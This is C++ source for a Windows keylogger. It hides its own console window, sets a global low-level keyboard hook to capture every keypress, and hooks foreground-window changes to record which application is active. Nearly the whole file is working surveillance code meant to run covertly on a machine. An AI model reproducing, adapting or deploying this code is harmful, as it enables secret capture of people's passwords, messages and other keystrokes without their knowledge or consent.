#define _WIN32_WINNT 0x0500
#include "KeyLogger.h"

LRESULT CALLBACK logKeyPresses(int nCode, WPARAM wParam, LPARAM lParam)
{
	/*
	Sends the char information of pressed keys to stdout
	*/
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
	std::string pressedKey;
	if (wParam == WM_KEYDOWN)
	{
		char currKey = p->vkCode;
		std::string pressedKey = KeyLogger::returnChar(currKey);
		KeyLogger::dataToOut(pressedKey);
	}
	
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

VOID CALLBACK logForegroundWindow
(
	HWINEVENTHOOK hWinEventHook, 
	DWORD dwEvent,
	HWND hwnd, 
	LONG idObject,
	LONG idChild, 
	DWORD dwEventThread,
	DWORD dwmsEventTime
)
{
	/* get active window */
	if (dwEvent == EVENT_SYSTEM_FOREGROUND)
	{
		// handle to a window
		HWND newWin = (HWND)hwnd;
		// LPSTR = long pointer to string
		std::string newWindow = KeyLogger::returnForegroundWindow(newWin);
		KeyLogger::dataToOut(newWindow);
	}
}

int main() 
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	// set hooks
	/*
	* https://stackoverflow.com/questions/22025592/setwindowshookex-vs-setwinhookeventex#:~:text=2%20Answers&text=SetWindowsHookEx%20sets%20low%2Dlevel%20hooks,less%20intrusive%20to%20the%20system.
	The first method of creating an event hook- using SetWindowsHookEx
	This is used for interacting with low-level functionality such as keyboard input
	
	A hook function initialized using SetWindowsHookEx can either be global or a thread lock
	global:	messages can be intercepted by all threads
	thread:	(obviously) messages generated within the thread can be intercepted 

	WH_KEYBOARD_LL is an exception to thi
	https://stackoverflow.com/questions/7458807/why-must-setwindowshookex-be-used-with-a-windows-message-queue
	*/
	HHOOK kboardHook = SetWindowsHookEx
	(
		WH_KEYBOARD_LL,
		logKeyPresses,
		NULL,
		0
	);

	HWINEVENTHOOK winHook = SetWinEventHook(
		EVENT_SYSTEM_FOREGROUND, 
		EVENT_SYSTEM_FOREGROUND, 
		NULL,
		logForegroundWindow, 
		0, 
		0, 
		WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS
	);

	MSG msg{ 0 };
	while (GetMessage(&msg, NULL, 0, 0) != 0) {
		//when keys are being pressed
		UnhookWindowsHookEx(kboardHook);
	}
}